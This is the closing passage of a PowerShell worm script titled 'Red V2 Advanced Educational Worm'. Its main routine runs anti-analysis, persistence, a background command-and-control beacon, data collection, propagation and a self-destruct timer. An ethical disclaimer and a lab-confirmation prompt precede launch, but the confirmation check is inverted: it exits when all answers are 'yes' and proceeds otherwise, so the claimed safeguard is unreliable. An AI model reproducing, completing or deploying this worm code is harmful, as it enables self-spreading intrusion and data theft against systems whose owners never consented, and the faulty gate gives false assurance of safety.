            Start-Sleep -Seconds $Global:WormConfig.BeaconInterval
        }
    }
}

# Timer monitoring loop
function Start-TimerLoop {
    while ($true) {
        if (Test-SelfDestructTimer) {
            break
        }
        Start-Sleep -Seconds 30
    }
}

# Main execution function
function Start-RedV2 {
    try {
        Write-WormLog "=== RED V2 ADVANCED EDUCATIONAL WORM STARTING ===" "SUCCESS"
        
        # Verify lab environment
        if (-not (Test-LabEnvironment)) {
            Write-WormLog "Lab environment verification failed" "ERROR"
            return
        }
        
        # Anti-analysis techniques
        Invoke-AntiAnalysis
        
        # Establish persistence
        Set-Persistence
        
        # Start C2 communication in background
        $c2Job = Start-Job -ScriptBlock ${function:Start-C2Loop}
        
        # Start self-destruct timer in background
        $timerJob = Start-Job -ScriptBlock ${function:Start-TimerLoop}
        
        # Data collection
        Invoke-DataCollection
        
        # Main propagation
        Invoke-Propagation
        
        Write-WormLog "=== RED V2 EXECUTION COMPLETED ===" "SUCCESS"
        
        # Clean up background jobs
        $c2Job, $timerJob | Stop-Job -PassThru | Remove-Job -Force
        
    }
    catch {
        Write-WormLog "Red V2 execution error: $($_.Exception.Message)" "ERROR"
        Invoke-SelfDestruct
    }
}

# Main entry point
function Main {
    Clear-Host
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host "RED V2 - ADVANCED EDUCATIONAL WORM (POWERSHELL EDITION)" -ForegroundColor Red
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host "ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited." -ForegroundColor Yellow
    Write-Host "This advanced PowerShell worm demonstrates real-world techniques for cybersecurity" -ForegroundColor White
    Write-Host "education in controlled lab environments with proper authorization." -ForegroundColor White
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    Write-Host "`nSAFETY VERIFICATION:" -ForegroundColor Yellow
    Write-Host "1. Confirm this is a controlled lab environment" -ForegroundColor White
    Write-Host "2. Confirm you have proper authorization" -ForegroundColor White
    Write-Host "3. Confirm this is for educational/research purposes only" -ForegroundColor White
    
    $confirmations = @()
    $confirmations += (Read-Host "`nConfirm controlled lab environment (yes/no)") -eq 'yes'
    $confirmations += (Read-Host "Confirm proper authorization (yes/no)") -eq 'yes'
    $confirmations += (Read-Host "Confirm educational purpose only (yes/no)") -eq 'yes'
    
    if (-not ($confirmations -contains $false)) {
        Write-Host "`nAll safety confirmations required. Exiting." -ForegroundColor Red
        return
    }
    
    Write-Host "`nStarting Red V2 in 5 seconds..." -ForegroundColor Green
    for ($i = 5; $i -gt 0; $i--) {
        Write-Host "Starting in $i..." -ForegroundColor Yellow
        Start-Sleep -Seconds 1
    }
    
    # Initialize and run Red V2
    Initialize-RedV2
    Start-RedV2
}

# Execute main function
Main 